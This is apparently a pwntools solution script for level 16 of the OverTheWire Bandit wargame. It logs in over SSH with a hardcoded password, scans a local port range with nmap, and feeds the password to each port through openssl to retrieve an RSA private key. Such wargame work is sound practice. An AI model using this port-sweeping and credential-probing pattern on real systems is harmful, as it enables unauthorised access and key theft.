#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 16
user = 'bandit%s' % level
host = 'bandit.labs.overthewire.org'
password = 'cluFn7wTiGryunymYOu4RcffSxQluehd'
port = 2220

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

sh = connectToLevel()
p = sh.process("for i in $(nmap -p 31000-32000 localhost |egrep -o \"[0-9][0-9][0-9][0-9][0-9]\" |tac) ; do echo %s | openssl s_client -ign_eof -quiet -connect localhost:$i; done" % password,shell=True)
log.info('Key = %s' % p.recvuntil('-----END RSA PRIVATE KEY-----'))
